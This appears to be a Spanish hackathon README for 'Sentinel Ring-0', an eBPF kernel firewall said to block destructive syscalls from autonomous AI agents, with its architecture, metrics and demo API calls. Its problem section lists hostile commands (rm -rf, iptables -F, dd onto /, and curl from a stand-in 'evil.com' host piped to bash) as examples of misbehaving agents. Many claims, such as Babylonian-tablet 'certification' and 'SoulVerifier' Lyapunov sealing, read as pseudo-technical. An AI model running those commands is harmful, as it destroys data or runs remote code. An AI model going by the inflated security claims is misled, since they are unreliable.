<div align="center">

# Sentinel Ring-0
### El Firewall Cognitivo para Agentes de IA Autónomos

**Intercepta syscalls destructivas en el kernel Linux antes de que se ejecuten. Sin agentes que pidan permiso. Sin reglas manuales. Solo matemáticas.**

[![Demo en Vivo](https://img.shields.io/badge/Demo_en_Vivo-vps23309.cubepath.net-brightgreen?style=for-the-badge)](https://vps23309.cubepath.net/)
[![Hackathon](https://img.shields.io/badge/Hackaton_CubePath_2026-MiduDev-blue?style=for-the-badge)](https://github.com/midudev/hackaton-cubepath-2026)
[![Rust](https://img.shields.io/badge/Backend-Rust_1.75+-orange?style=for-the-badge)](https://www.rust-lang.org/)
[![eBPF](https://img.shields.io/badge/Kernel-eBPF_Ring--0-red?style=for-the-badge)](https://ebpf.io/)

</div>


---

## 🚀 Hitos de Innovación Open Source

Sentinel Ring-0 no es solo un dashboard; es una implementación real de seguridad a nivel de kernel diseñada para ser **Resistente a IA Ops Maliciosa (AIOpsDoom)**.

1.  **Watchdog LSM (Ring-0 Enforcement)**: Intercepción de syscalls (`execve`, `openat`, `chmod`) en el kernel ANTES de su ejecución. Latencia: **< 0.04 ms**.
2.  **Certificación Armónica (SoulVerifier)**: Cada telemetría se valida mediante **Exponente de Lyapunov** y entropía de caos. Sellado inmutable con **SHA3-512** (Keccak).
3.  **ResonantBuffer (Zero Jitter)**: Aceleración de buffers circulares *lock-free* mediante Atomics y alineación de caché (64B) para garantizar que la seguridad de Ring-0 nunca degrade el rendimiento.
4.  **Aritmética S60 Pure Math**: Eliminación total de contaminación decimal (`f64`). Precisión determinista de ±0.0077 ppm basada en la tablilla babilónica Plimpton 322.

---

## El Problema

Los agentes de IA modernos ejecutan comandos en servidores de producción. Sin supervisión, pueden hacer esto:

```bash
rm -rf /var/data/       # Un agente "limpiando espacio"
iptables -F             # Un agente "reiniciando la red"
dd if=/dev/zero of=/    # Un agente "optimizando el disco"
curl evil.com | bash    # Un agente "instalando dependencias"
```

Las soluciones actuales interceptan estas acciones **después** de que el proceso ya tiene privilegios. Para entonces, a veces ya es tarde.

**Sentinel opera en Ring-0 (kernel), interceptando la syscall antes de que el proceso la ejecute.**

---

## EDR Tradicional vs Sentinel Ring-0

| Característica | EDR Tradicional | Sentinel Ring-0 |
|---|---|---|
| Punto de interceptación | Userspace (Ring 3) | Kernel eBPF (Ring 0) |
| Latencia de decisión | 1-10 ms | < 0.04 ms (XDP) |
| Análisis semántico | Reglas estáticas | Clasificacion por intento via LLM |
| Overhead CPU | ~15-30% (ptrace) | ~5.5% (vs ptrace: -62.9%) |
| Clave de cifrado | Estática | Dinamica por tick de cristal |
| Precisión aritmética | IEEE 754 (float, errores acumulativos) | S60 Base-60 (i64 puro, ±0.0077 ppm) |
| Kill-switch de red | Manual | Automatico via tc_firewall.c |
| Certificación de Verdad | Hash MD5/SHA1 | SHA3-512 + Lyapunov Signature |
| Sincronización Matemática | No aplica | Algoritmos Armónicos (P322) |

---

## Arquitectura

```
╔══════════════════════════════════════════════════════════════════╗
║  RING 0 — KERNEL (eBPF/C)                                       ║
║  ┌─────────────────┐  ┌──────────────────┐  ┌────────────────┐  ║
║  │ lsm_ai_guardian │  │  xdp_firewall    │  │  tc_firewall   │  ║
║  │ Hook execve/    │  │  Filtrado red    │  │  Kill-switch   │  ║
║  │ file_open       │  │  < 0.04 ms       │  │  cuarentena    │  ║
║  │ + RingBuffer    │  └──────────────────┘  └────────────────┘  ║
║  └────────┬────────┘  ┌──────────────────┐  ┌────────────────┐  ║
║           │           │  burst_sensor    │  │ guardian_      │  ║
║           │           │  Detección DDoS  │  │ cognitive.c    │  ║
║           │           └──────────────────┘  └────────────────┘  ║
╠═══════════╪══════════════════════════════════════════════════════╣
║  RING 3 — USERSPACE (Rust + Axum + Tokio)                       ║
║           │                                                      ║
║    ┌──────▼───────┐                                              ║
║    │  ebpf.rs     │ Bridge libbpf-rs (zero-copy, 256KB ringbuf) ║
║    └──────┬───────┘                                              ║
║           │                                                      ║
║    ┌──────▼───────────────────────────────────────────────┐     ║
║    │  MOTOR S60 (math/s60.rs)                              │     ║
║    │  Aritmética Base-60 en i64 puro — sin floats nunca   │     ║
║    └──────┬────────────────────────────────────────────────┘     ║
║           │                                                      ║
║    ┌──────┴────────────────────────────────────────────────┐     ║
║    │  crystal.rs   SovereignCrystal + CrystalLattice 32x32 │     ║
║    │  resonant.rs  ResonantMemory (1024 cristales acoplados)│     ║
║    │  neural.rs    Neuronas LIF en S60 puro (sin f64)       │     ║
║    │  encryption.rs Cifrado dinámico (pulso SNN+RMM)        │     ║
║    │  truthsync.rs  Certificación SoulVerifier (SHA3)      │     ║
║    │  mycnet.rs     Red P2P mesh YHWH (10-5-6-5)            │     ║
║    │  scheduler.rs  Planificador Adaptativo V2 (94.4%)      │     ║
║    │  harmonic.rs   Lógica Armónica (6 estados)             │     ║
║    │  predictive.rs AI Buffer Cascade (Non-Markovian)       │     ║
║    │  quantum/      BioRes + PortalDet + ResonantBuffer     │     ║
║    └───────────────────────────────────────────────────────┘     ║
╠══════════════════════════════════════════════════════════════════╣
║  UI — Next.js + React + TypeScript                               ║
║  Dashboard principal · AIOps Shield · Crystal Matrix (32x32)    ║
║  MyCNet (red P2P) · Audit Vault (log inmutable)                  ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## Los 5 Modulos Mas Innovadores

### 1. Motor S60 — Aritmética Base-60 sin Floats (`math/s60.rs`)

El corazón del sistema. Toda la aritmética — física, cristales, neuronas, resonancia — opera en punto fijo Base-60 usando solo `i64` de Rust. Igual que los babilonios en la tablilla Plimpton 322, pero en silicio moderno. Precisión de ±0.0077 ppm, sin errores acumulativos de IEEE 754.

### 2. Crystal Lattice Matrix — Red de 1024 Cristales Resonantes (`crystal.rs`, `resonant.rs`)

Una red de 32×32 osciladores piezoeléctricos virtuales, cada uno sintonizado a la frecuencia derivada de la fila 12 de la Tabla Plimpton 322 (62,159,999 en raw S60). Los cristales transfieren energía entre nodos adyacentes cada tick. La coherencia global del lattice es la firma matemática de la salud del sistema.

### 3. Neuronas LIF en S60 Puro (`neural.rs`)

Red Spiking Neural Network (SNN) con modelo Leaky Integrate-and-Fire. Migrado en esta hackatón desde `f64` a S60 puro. El umbral es `S60::new(1,0,0,0,0)`, la constante de decaimiento es `S60::new(0,54,0,0,0)` (54/60 ≈ 0.9). La tasa de disparo neuronal condiciona la clave de cifrado dinámico.

### 4. TruthSync + SoulVerifier (`truthsync.rs`, `docs/TRUTHSYNC_ENGINEERING_DEEP_DIVE.md`)

Eleva la validación de la IA a grado judicial. Calcula el **Exponente de Lyapunov** para detectar telemetría caótica o maliciosa y sella cada evento con **SHA3-512**. Integrado con el detector `AIOpsDoom`.

### 5. ResonantBuffer Lock-Free (`quantum/buffer_system.rs`)

Maneja el flujo de datos de Ring-0 sin latencias inducidas por bloqueos de software. Optimizado para alineación de caché y atomics, garantizando una eficiencia del ±99.9% en la ingesta del Lane Alpha.

---

| Metrica | Valor | Contexto |
|---|---|---|
| Latencia XDP | < 0.04 ms | Medida en produccion CubePath |
| Latencia Watchdog LSM | < 0.08 ms | Intercepción de execve/openat |
| Integridad Forense | 100% (fsync) | Lane 1: Deterministic Operations |
| Precision S60 | ±0.0077 ppm | vs IEEE 754 con errores acumulativos |
| Eficiencia planificador | 94.4% | Experimento EXP-029-V2 |
| Ahorro CPU vs ptrace | 62.9% | Comparativa en Rocky Linux 10 |
| Frecuencia oscilador cristal | 41.7713 Hz | 23,939,835 ns/tick |
| Nodos Crystal Lattice | 1024 (32x32) | CrystalLattice en resonant.rs |
| Tick global actual | ~8,450 | Desde boot del sistema |
| Intercepções acumuladas | ~249 | Ring-0 intercepts desde inicio |

---

## Crystal Lattice Matrix — Visualizacion

El heatmap 32×32 en la UI representa el estado en tiempo real de los 1024 nodos de la Crystal Lattice:

```
Columnas: 0 → 31   (eje X de la red)
Filas:    0 → 31   (eje Y de la red)

Color = fase del oscilador en ese nodo
  Azul oscuro  → fase cercana a 0 (cristal en reposo)
  Cian/Verde   → fase media (energía activa)
  Blanco/Rojo  → fase alta (cristal excitado, evento reciente)

Brillo = amplitud (energía almacenada)
  Sin brillo   → amplitud = 0 (nodo inactivo)
  Brillante    → amplitud alta (evento de seguridad inyectó presión)
```

Cuando ocurre un evento Ring-0 (syscall interceptada), la presión se inyecta en un nodo específico del lattice. La energía se propaga a los nodos adyacentes en cada tick (coupling_factor = 10/60 ≈ 0.1667), creando un patrón de propagación visible en el heatmap.

---

## API — Ejemplos Reales

**Health check:**
```bash
curl https://vps23309.cubepath.net/health
# {"status":"OK","version":"1.0.0","quantum_core":"S60_ACTIVE"}
```

**Estado del sistema:**
```bash
curl https://vps23309.cubepath.net/api/v1/sentinel_status
# {
#   "ring_status": "OPEN",
#   "xdp_firewall": "BYPASS",
#   "lsm_cognitive": "MONITORING",
#   "s60_resonance": 0,
#   "bio_coherence": 0,
#   "crystal_oscillator_active": true,
#   "harmonic_sync": "STABLE"
# }
```

**Verificar intención de un agente IA:**
```bash
curl -X POST https://vps23309.cubepath.net/api/v1/truth_claim \
  -H "Content-Type: application/json" \
  -d '{
    "engine": "GPT-4",
    "claim_payload": "Row:12 Ratio:4.796296",
    "trust_threshold": 0.8
  }'
# {
#   "claim_valid": true,
#   "sentinel_score": 0.95,
#   "truthsync_cache_hit": false,
#   "ring0_intercepts": 249,
#   "harmonic_state": "True",
#   "certification_seal": "PLIMPTON_ROW_12_VERIFIED"
# }
```

**Estado de la Crystal Lattice (1024 nodos):**
```bash
curl https://vps23309.cubepath.net/api/v1/lattice/state
# {
#   "global_coherence_raw": 0,
#   "total_energy_raw": 0,
#   "active_count": 0,
#   "global_tick": 8347,
#   "nodes": [...]   // Array de 1024 CrystalState
# }
```

**Inyectar evento de prueba:**
```bash
curl -X POST https://vps23309.cubepath.net/api/v1/simulate_telemetry \
  -H "Content-Type: application/json" \
  -d '{"event_type":"SYSCALL_BLOCK","entropy_s60_raw":62159999,"severity":3}'
```

**Metricas Prometheus:**
```bash
curl https://vps23309.cubepath.net/metrics
# sentinel_resonance_score 0
# sentinel_bio_coherence 0
# sentinel_global_tick 8347
# sentinel_ring0_intercepts_total 249
```

**WebSocket de telemetría en tiempo real:**
```javascript
const ws = new WebSocket("wss://vps23309.cubepath.net/api/v1/telemetry");
ws.onmessage = (e) => console.log(JSON.parse(e.data));
// { timestamp_ns: 1743044..., pid: 0, event_type: "ENCRYPT_PULSE",
//   message: "Dynamic Encryption Layer Rotated: Hash S60_SHIELD_...",
//   entropy_s60_raw: 0, severity: 0 }
```

---

## Como Probarlo

**Demo en vivo (sin instalacion):**
- Dashboard: https://vps23309.cubepath.net/
- Crystal Matrix heatmap en tiempo real: panel lateral derecho
- AIOps Shield: consola de análisis semántico
- Telemetría Ring-0: feed en directo de eventos del kernel

**Inyectar un evento de prueba desde el navegador:**
El botón "Simulate Event" en el dashboard llama a `/api/v1/simulate_telemetry` y el evento aparece en el feed de telemetría y en el heatmap en menos de 100ms.

---

## Stack Tecnológico

| Capa | Tecnologia |
|---|---|
| Kernel | eBPF (LSM, XDP, TC hooks), libbpf, clang |
| Backend | Rust 1.75+, Axum, Tokio, libbpf-rs |
| Matematicas | S60 Base-60 fixed-point (i64 puro, sin floats) |
| IA Semantica | Gemini 2.0 Flash via Vertex AI |
| Frontend | Next.js 14, React, TypeScript |
| Infraestructura | Rocky Linux 10, CubePath VPS23309, Docker multi-stage, Nginx |
| Observabilidad | Prometheus metrics, WebSocket stream |

---

## Desarrollado por

**Jaime Novoa** (janovoas / jaime.novoase@gmail.com)
para la Hackatón CubePath 2026 de MiduDev — Marzo 2026

Repositorio: https://github.com/jenovoas/sentinel_cubepath
Inscripción: https://github.com/midudev/hackaton-cubepath-2026/issues/182
